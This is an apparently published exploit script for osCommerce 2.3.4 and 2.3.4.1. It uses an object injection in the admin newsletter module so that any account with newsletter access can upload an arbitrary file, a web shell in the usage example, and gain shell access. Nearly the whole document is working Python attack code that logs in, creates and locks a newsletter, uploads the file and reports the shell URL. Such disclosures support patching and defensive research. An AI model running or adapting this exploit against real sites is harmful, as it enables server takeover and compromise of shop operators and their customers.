# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
# Vendor Homepage: https://www.oscommerce.com/
# Software Link: https://www.oscommerce.com/Products&Download=oscom234
# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
# Tested on: Linux, Windows
 
"""
osCommerce does by default not allow Users to upload arbitrary files from the Admin Panel. However, any user
being privileged enough to send newsletters can exploit an objection injection in the osCommerce core to
upload any file, allowing the user to gain shell access. The user does not need to be an administrator,
any account with access to the newsletters will do.
More details can be found here:
    https://scannell-infosec.net/uploading-a-shell-from-within-the-oscommerce-admin-panel-via-object-injection/
"""
 
import urlparse
import argparse
import sys
import requests
 
 
DEFAULT_ADMIN_URL = "/catalog/admin/"
DEFAULT_NEWSLETTER_SCRIPT = "/catalog/admin/newsletters.php"
 
 
# Builds an authenticated session and returns it if it was successful
def authenticate(username, password, url):
    # Build the Session and grab the inital cookie
    session = requests.Session()
    session.get(url + "login.php", allow_redirects=False)
 
    get_params = {&#039;action&#039;: "process"}
    data = {"username": username, "password": password}
 
    # Attempt the authentication
    r = session.post(url + "login.php", data=data, params=get_params, allow_redirects=False)
 
    if r.status_code == 302:
        return session
    else:
        return False
 
 
def upload_file(local_filename, session, url):
    newsletter_script = url + "newsletters.php"
    r = session.get(newsletter_script, params={"action": "new"})
 
    payload = {
        &#039;module&#039;: &#039;upload&#039;,
        &#039;title&#039;: &#039;uploaded_fname&#039;,
        &#039;content&#039;: &#039;./&#039;
    }
 
    # Create the vulnerable newsletter and grab its ID
    r = session.post(newsletter_script, params={"action": "insert"}, data=payload, allow_redirects=False)
    try:
        newsletter_id = urlparse.urlparse(r.headers[&#039;Location&#039;]).query[4:]
    except:
        print "[-] The script wasn&#039;t able to create a new newsletter"
        exit(1)
 
    # Now lock the newsletter
    r = session.post(newsletter_script, params={"action": "lock", "nID": newsletter_id})
    print "[+] Successfully locked the newsletter. Now attempting to upload.."
 
    # Send the final request, containing the file!
    files = {
        &#039;uploaded_fname&#039;: open(local_filename)
    }
    r = session.post(newsletter_script, params={"action": "send", "nID": newsletter_id}, files=files)
 
    print "[*] Now trying to verify that the file %s uploaded.." % (local_filename)
 
    shell_url = url + local_filename
    r = requests.get(shell_url)
    print "[+] Got a HTTP 200 Reply for the uploaded file!"
    print "[+] The uploaded file should now be available at %s" % (shell_url)
 
 
 
# Main Routine starts here
 
usage = " %s -u TARGET_URL -a AUTH -f FILE [-p ADMIN_PATH]\n\n" \
        "Example: %s -u http://localhost/path/to/osCommerce --auth=admin:admin_password -f shell.php\n\n" \
        "NOTE: For a more detailed description on the arguments use the -h switch\n\n\n" % (sys.argv[0], sys.argv[0])
 
 
parser = argparse.ArgumentParser(description=&#039;\n\nosCommerce 2.3.4 Authenticated Arbitrary File Upload&#039;, usage=usage)
parser.add_argument(&#039;-u&#039;, &#039;--target-url&#039;, help=&#039;The target URL, including the path to the osCommerce installation (can also be document root /)&#039;, required=True)
parser.add_argument(&#039;-a&#039;, &#039;--auth&#039;, help=&#039;Credentials for a privileged user in the format of username:password&#039;, required=True)
parser.add_argument(&#039;-f&#039;, &#039;--file&#039;, help="The local file to be uploaded to the vulnerable webhost", required=True)
parser.add_argument(&#039;-p&#039;, &#039;--admin-path&#039;, help="The path for the osCommerce Admin Area. This defaults to /catalog/admin/", required=False)
args = parser.parse_args()
 
# Parse username and password
username = args.auth.split(":")[0]
password = args.auth.split(":")[1]
 
 
url = args.target_url
# If the user hasn&#039;t passed a path to the osCommerce Admin Panel, use the default
if not args.admin_path:
    url += DEFAULT_ADMIN_URL
else:
    url += args.admin_path
 
# Authenticate the user and establish the connection
session = authenticate(username, password, url)
 
if not session:
    print "[-] The script wasn&#039;t able to authenticate itself to osCommerce. Are you sure that the credentials are correct? Is %s the Admin Path?" % (url + "login.php")
    exit(1)
else:
    print "[+] Authentication successful"
 
upload_file(args.file, session, url)

